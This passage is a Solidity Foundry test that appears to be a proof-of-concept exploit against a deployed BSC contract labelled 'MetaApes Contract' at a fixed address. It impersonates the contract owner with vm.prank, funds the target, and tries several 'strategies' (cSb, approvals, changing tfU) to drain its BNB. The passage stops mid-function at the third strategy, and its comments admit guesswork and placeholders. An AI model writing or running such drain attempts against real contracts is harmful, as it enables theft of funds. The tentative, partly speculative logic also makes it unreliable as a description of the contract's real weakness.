    // ─── State Variables ─────────────────────────────────────

    address constant TARGET = 0xd764457Fadd15B52089BeE2b3c38964C7dFf0B70;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll impersonate the owner directly
        // The test framework already provides TARGET address
        vm.label(TARGET, "MetaApes Contract");

        // Get the current owner of the contract
        address owner = MetaApesBSC(TARGET).getOwner();
        vm.label(owner, "Contract Owner");

        // Label attacker for clarity
        vm.label(attacker, "Attacker");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Record initial balance
        uint256 initialBalance = attacker.balance;
        console.log("Initial attacker balance:", initialBalance);

        // Get owner
        address contractOwner = MetaApesBSC(TARGET).getOwner();
        console.log("Contract owner:", contractOwner);

        // Ensure contract has BNB
        if (TARGET.balance == 0) {
            deal(TARGET, 5 ether);
            console.log("Sent 5 ETH to contract");
        }
        uint256 contractBalance = TARGET.balance;
        console.log("Contract balance:", contractBalance);

        // Try Strategy 1: Direct drain with cSb
        console.log("\n=== Strategy 1: cSb(100) ===");
        vm.prank(contractOwner);
        try MetaApesBSC(TARGET).cSb(100) {
            console.log("cSb(100) executed");
        } catch {
            console.log("cSb failed");
        }

        // Check if we got BNB (if owner == address(this) in this test context)
        // In Foundry tests, attacker = address(this), but owner is different
        // So BNB goes to owner, not to attacker

        // Try Strategy 2: approvals
        console.log("\n=== Strategy 2: approvals(1,1) ===");
        vm.prank(contractOwner);
        try MetaApesBSC(TARGET).approvals(1, 1) {
            console.log("approvals(1,1) executed");
        } catch {
            console.log("approvals failed");
        }

        // Check contract balance after strategies 1 & 2
        uint256 contractBalanceAfter = TARGET.balance;
        console.log("Contract balance after strategies 1&2:", contractBalanceAfter);

        // If contract still has BNB, try Strategy 3: Change tfU then drain
        if (contractBalanceAfter > 0) {
            console.log("\n=== Strategy 3: Change tfU then drain ===");

            // First, let's see if we can call setrecadd to change tfU
            // We need to know current addresses, but we can try with placeholders
